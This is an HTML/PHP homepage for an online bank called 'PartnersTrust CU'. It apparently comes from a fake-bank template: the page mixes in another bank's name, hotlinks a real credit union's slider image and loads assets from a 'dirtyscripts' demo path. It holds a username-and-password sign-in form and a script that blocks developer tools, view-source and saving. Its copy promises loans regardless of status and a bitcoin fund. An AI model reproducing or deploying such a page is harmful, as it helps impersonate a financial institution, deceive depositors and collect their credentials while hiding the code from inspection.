<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8" />
  <title>PartnersTrust CU - Home</title>
  <meta property="og:image" content="images/logo.html" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="front/css/bootstrap.min.css" rel="stylesheet" />
  <link href="front/css/main.css" rel="stylesheet" />
  <link href="front/css/responsive.css" rel="stylesheet" />
  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@100;500;600;700;900&amp;family=Libre+Baskerville:wght@400;700&amp;family=Work+Sans:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet" />
  <!-- Add site Favicon -->
  <link rel="icon" type="image/x-icon" href="ui/assets/img/favicon.ico" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.css" integrity="sha512-NtU/Act0MEcVPyqC153eyoq9L+UHkd0s22FjIaKByyA6KtZPrkm/O5c5xzaia4pyCfReCS634HyQ7tJwKNxC/g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/2.5.0/remixicon.css" integrity="sha512-CWRnZlthFAu05mm4Pu5R/ikDV/2jPo6cgmkpdtBFWUY9/mqNFuTmgwnpBWqDiIeMdn5wv1NEQFdt82/Ak+uzkg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    .lower-content p {
      color: #1F1B44 !important;
      position: relative;
      z-index: 2;
    }
    .sidebar-widget ul li a,
    .auto-container,
    .auto-container h2 {
      color: #1F1B44;
      position: relative;
      z-index: 2;
    }
  </style>
  <script>
    document.onkeydown = function(e) {
      if (event.keyCode == 123) {
        return false;
      }
      if (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'i'.charCodeAt(0))) {
        return false;
      }
      if (e.ctrlKey && e.shiftKey && (e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'c'.charCodeAt(0))) {
        return false;
      }
      if (e.ctrlKey && e.shiftKey && (e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'j'.charCodeAt(0))) {
        return false;
      }
      if (e.ctrlKey && (e.keyCode == 'U'.charCodeAt(0) || e.keyCode == 'u'.charCodeAt(0))) {
        return false;
      }
      if (e.ctrlKey && (e.keyCode == 'S'.charCodeAt(0) || e.keyCode == 's'.charCodeAt(0))) {
        return false;
      }
    }
  </script>
</head>
<body>
<!-- <body oncontextmenu="return false"> -->

<div class="page-wrapper">
  <!-- Main Header-->
  <?php include 'inc/header.php'; ?>
  <!-- End Main Header -->



	<!-- CTA Section Start -->
	<!-- <div class="cta-section" style="background:#1F1B44;">
		<div class="auto-container">
			<div class="row align-items-center">
				<div class="col-lg-7">
					<div class="cta-content">
						<h3 class="title">For Enquires Or Support</h3>
						<p>We prodive a dedicated support 24/7 for any your question</p>
					</div>
				</div>
				<div class="col-lg-5">
					<div class="cta-phone text-lg-end text-strat">
						<h2 class="title">(715)600-6612</h2>
						<a href="mailto:info@partnerstrustbank.com" class="text-white">info@partnerstrustbank.com</a>
					</div>
				</div>
			</div>
		</div>
	</div> -->
	<!-- CTA Section End -->

	<div id="carouselExampleCaptions" class="carousel slide home-slider" data-bs-ride="carousel">
    <div class="carousel-indicators">
      <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
      <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="1" aria-label="Slide 2"></button>
      <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="2" aria-label="Slide 3"></button>
    </div>
    <div class="carousel-inner">
      <div class="carousel-item active">
        <img src="//www.bscu.org/wp-content/uploads/slider/cache/067562c0c1a0f1e95c8211d6c7b9e725/Website-Sliders-2024.jpg" class="d-block w-100" style="min-height:165px;" alt="...">
        <div class="carousel-caption d-flex">
        	<div class="w-700 sm-caption-inner d-flex d-sm-none px-3 jumbotron bg-transparent">
	          <h5>Welcome to Partners Trust Credit Union online banking, get started.</h5>
	          <a href="./login" class="btn bg-light text-dark round-30 px-4 ms-auto mt-auto">
	          	<span style="min-width:55px;display:block;">Sign in</span>
	          </a>
	        </div>
        	<div class="w-75 p-4 my-auto sm-caption-inner d-none d-sm-block jumbotron bg-transparent">
        		<form id="loginForm" class="col-10 login-card">
        			<h3 class="mb-4">Welcome to PartnersTrust Credit Union online banking, get started.</h3>
        			<h6 class="mb-3 text-light">Sign in</h6>
        			<div class="w-100 d-flex mb-3">
	        			<p class="pe-2"><input type="text" name="email" class="form-control" placeholder="Username or Email Adrress" required /></p>
	        			<p class="ps-2"><input type="password" name="password" class="form-control" placeholder="Enter password" required /></p>
	        		</div>
        			<div class="feedback w-50"></div>
        			<button class="submit-btn btn btn-lg">Sign in</button>
        			<input type="hidden" name="user_login">
        			<p class="mt-4"><a href="reset-password" class="text-light">Forgot password?</a></p>
        		</form>
	        </div>
        </div>
      </div>
    </div>
    <!-- <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="prev">
        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
        <span class="visually-hidden">Previous</span>
    </button>
    <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="next">
        <span class="carousel-control-next-icon" aria-hidden="true"></span>
        <span class="visually-hidden">Next</span>
    </button> -->
	</div>

	<!-- About Section -->
	<div class="about-section">
		<div class="auto-container">
			<div class="inner-container">
				<div class="row align-items-center clearfix">
					<!-- Image Column -->
					<div class="image-column col-lg-6">
						<div class="about-image">
							<div class="about-inner-image">
								<img src="assets/images/eduardo-soares.jpg" alt="about">
							</div>
						</div>
					</div>

					<!-- Content Column -->
					<div class="content-column col-lg-6 col-md-12 col-sm-12 mb-0">
						<div class="about-column">
							<div class="sec-title">
								<div class="title">about us</div>
								<h2> <span>PartnersTrust CU</span> <br></h2>
							</div>
							<div class="text">
								<p>
									PartnersTrust CU continues to serve the financial needs of individuals, farmers, businesses, and industries by offering the traditional banking products, as well as online, mobile and telephone banking products.
								</p>
							</div>
							<div class="signature">Winsthood</div>
						</div>
					</div>

				</div>
			</div>
		</div>
	</div>
	<!-- End About Section -->

	<!-- Services Section -->
	<div class="services-section">
		<div class="auto-container">
			<div class="sec-title">
				<div class="title">our services</div>
				<h2><span>Best Solutions</span> For Your Business</h2>
			</div>
			<div class="inner-container">
				<div class="row g-0">

					<!-- Service Block -->
					<div class="service-block col-lg-3 col-md-6 col-sm-12">
						<div class="inner-box">
							<div class="icon-box">
								<span class="icon ti-shield"></span>
							</div>
							<h5><a>Secure Transactions</a></h5>
							<div class="text">Very secured and supervised means to save, invest and transfer your funds at full guarantee.</div>
						</div>
					</div>

					<!-- Service Block -->
					<div class="service-block col-lg-3 col-md-6 col-sm-12">
						<div class="inner-box">
							<div class="icon-box">
								<span class="icon ti-home"></span>
							</div>
							<h5><a>Real Estate</a></h5>
							<div class="text">Invest in the Real Estate Industry, the Fastest and largest income generator. National Trust Bank gives you this superior and unique edge.</div>
						</div>
					</div>

					<!-- Service Block -->
					<div class="service-block col-lg-3 col-md-6 col-sm-12">
						<div class="inner-box">
							<div class="icon-box">
								<span class="fab fa-bitcoin"></span>
							</div>
							<h5><a>Digital Assets</a></h5>
							<div class="text">Digital assets, like bitcoin, are an emerging asset class for investors.Our digital asset fund offers investors exposure to bitcoin and other assets.</div>
						</div>
					</div>

					<!-- Service Block -->
					<div class="service-block col-lg-3 col-md-6 col-sm-12">
						<div class="inner-box">
							<div class="icon-box">
								<span class="icon ti-money"></span>
							</div>
							<h5><a> Quick Loans</a></h5>
							<div class="text">We have great loan offers to help meet your needs with very low interest rates. Also available to every one regardless of your status.</div>
						</div>
					</div>

				</div>

			</div>
		</div>
	</div>
	<!-- End Services Section -->


	<!-- Sponsors Section -->
	<div class="sponsors-section">
		<div class="auto-container">

			<div class="carousel-outer">
				<!--Sponsors Slider-->
				<ul class="sponsors-carousel owl-carousel owl-theme">
					<li>
						<div class="image-box"><a href="#"><img src="../demofederal.dirtyscripts.shopfront/images/clients/1.png" alt=""></a></div>
					</li>
					<li>
						<div class="image-box"><a href="#"><img src="../demofederal.dirtyscripts.shopfront/images/clients/2.png" alt=""></a></div>
					</li>
					<li>
						<div class="image-box"><a href="#"><img src="../demofederal.dirtyscripts.shopfront/images/clients/4.png" alt=""></a></div>
					</li>
					<li>
						<div class="image-box"><a href="#"><img src="../demofederal.dirtyscripts.shopfront/images/clients/5.png" alt=""></a></div>
					</li>
					<li>
						<div class="image-box"><a href="#"><img src="../demofederal.dirtyscripts.shopfront/images/clients/1.png" alt=""></a></div>
					</li>
					<li>
						<div class="image-box"><a href="#"><img src="../demofederal.dirtyscripts.shopfront/images/clients/2.png" alt=""></a></div>
					</li>
				</ul>
			</div>

		</div>
	</div>
	<!--End Sponsors Section-->

	<!-- Reputation Section Two -->
	<div class="reputation-section-two style-two">
		<div class="auto-container">
			<div class="row clearfix">

				<!-- Form Column -->
				<div class="form-column col-lg-5 col-md-12 col-sm-12">
					<div class="inner-column">
						<div class="form-boxed">
							<!-- <h5>Our Values</h5> -->
							<div class="text">The mission of PartnersTrust CU is to contribute to the sustainable development of the international banking sector by
								providing. Below are our core values</div>

							<div class="consult-form">
								<div class="sidebar-widget categories-blog">
									<div class="sidebar-title">
										<h4>Our Values</h4>
									</div>
									<ul>
										<li><a>Integrity and honesty </a></li>
										<li><a>Loyalty </a></li>
										<li><a>Teamwork</a></li>
										<li><a>Community </a></li>
										<li><a>Accountability </a></li>
										<li><a>Excellence </a></li>
										<li><a>Confidentiality </a></li>
										<li><a>Relationship </a></li>
									</ul>
								</div>
							</div>
						</div>

					</div>
				</div>

				<!-- Content Column -->
				<div class="content-column col-lg-7 col-md-12 col-sm-12">
					<div class="inner-column">
						<div class="sec-title">
							<div class="title">why choose us</div>
							<h2><span>Your Success </span>Means<br> a lot To Us</h2>
						</div>
						<div class="blocks-outer">

							<!-- Reputation Block -->
							<div class="reputation-block">
								<div class="inner-box">
									<h5>Our Vision</h5>
									<div class="text">To be a leading bank in the World, supporting the development of small businesses and financial inclusion around the world.</div>
								</div>
							</div>

							<!-- Reputation Block -->
							<div class="reputation-block">
								<div class="inner-box">
									<h5>Our Mission</h5>
									<div class="text">The mission of National Trust Bank is to contribute to the sustainable development of the international banking sector by
										providing responsible financial services and solutions to households and micro, small and medium enterprises, using internationally
										recognized best banking practices. We are committed to delivering value for our clients, shareholders, employees, and society at large.
										The mission is based on our values: integrity and openness, professionalism, commitment to customers, team work, and social and
										environmental responsibility.</div>
								</div>
							</div>



						</div>
					</div>
				</div>

			</div>
		</div>
	</div>
	<!-- End Reputation Section -->

	<!-- Blog Section -->
	<div class="blog-section">
		<div class="auto-container">
			<!-- Sec Title -->

			<div class="inner-container">
				<div class="clearfix row g-0">
					<!-- Column -->
					<div class="column col-lg-8 col-md-12 col-sm-12">

						<!-- News Block -->
						<div class="news-block">
							<div class="inner-box">
								<div class="clearfix">
									<!-- Image Column -->
									<!-- <div class="image-column col-lg-6 col-md-6 col-sm-12">
										<div class="inner-column">
											<div class="image">
												<a><img src="../demofederal.dirtyscripts.shopfront/images/resource/news-1.jpg" alt="" /></a>
											</div>
										</div>
									</div> -->
									<!-- Content Column -->
									<div class="content-column col-lg-6 col-md-6 col-sm-12">
										<div class="inner-column">
											<div class="arrow-one"></div>
											<div class="title">Home Mortgage Loans</div>
											<h4><a>The keys to your dream home are within reach — and we can help you get them with affordable and flexible rates.</a></h4>
											<div class="post-date">December 14th, 2020 by <span>Admin</span></div>
										</div>
									</div>
								</div>
							</div>
						</div>

						<!-- News Block -->
						<div class="news-block">
							<div class="inner-box">
								<div class="clearfix row g-0">
									<!-- Content Column -->
									<div class="content-column col-lg-6 col-md-6 col-sm-12 order-lg-1 order-2">
										<div class="inner-column">
											<div class="arrow-two"></div>
											<div class="title">Personal Needs</div>
											<h4><a>Whether it's a sudden expense or just vacation to get away from everything, National Trust Bank can make it happen.</a></h4>
											<div class="post-date">June 6th, 2003 by <span>Admin</span></div>
										</div>
									</div>
									<!-- Image Column -->
									<!-- <div class="image-column col-lg-6 col-md-6 col-sm-12 order-lg-2 order-1">
										<div class="inner-column">
											<div class="image">
												<a><img src="../demofederal.dirtyscripts.shopfront/images/resource/news-2.jpg" alt="" /></a>
											</div>
										</div>
									</div> -->
								</div>
							</div>
						</div>

					</div>

					<!-- Column -->
					<div class="column col-lg-4 col-md-12 col-sm-12">
						<!-- News Block Two -->
						<div class="news-block-two">
							<div class="inner-box">
								<!-- <div class="image">
									<a><img src="../demofederal.dirtyscripts.shopfront/images/resource/news-3.jpg" alt="" /></a>
									<div class="arrow"></div>
								</div> -->
								<div class="lower-content">
									<div class="title">HSA</div>
									<h4><a>An HSA (Health Saving Account) helps employees save in advance for future medical expenses.</a></h4>
									<div class="post-date">May 13th, 2013 by <span>Admin</span></div>
								</div>
							</div>
						</div>
					</div>

				</div>
			</div>
		</div>
	</div>
	<!-- End Blog Section -->

	<!-- Main Footer -->
	<?php include 'inc/footer.php'; ?>
</div>
<!--End pagewrapper-->

<!-- Scroll To Top -->
<div class="scroll-to-top scroll-to-target" data-target="html">
  <span class="fa fa-arrow-circle-up"></span>
</div>


<!-- <script src="utils/js/jquery.js"></script> -->
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
<!-- Custom Js -->
<script src="assets/js/forms.js"></script>
<!-- <script src="utils/js/popper.min.js"></script> -->
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
<!-- <script src="utils/js/bootstrap.min.js"></script> -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.0.0-beta1/js/bootstrap.min.js" integrity="sha512-ZvbjbJnytX9Sa03/AcbP/nh9K95tar4R0IAxTS2gh2ChiInefr1r7EpnVClpTWUEN7VarvEsH3quvkY1h0dAFg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="utils/js/jquery.mCustomScrollbar.concat.min.js"></script>
<script src="utils/js/jquery.fancybox.js"></script>
<script src="utils/js/appear.js"></script>
<script src="utils/js/owl.js"></script>
<script src="utils/js/wow.js"></script>
<script src="utils/js/validate.js"></script>
<script src="utils/js/jquery-ui.js"></script>
<script src="utils/js/script.js"></script>
</body>
</html>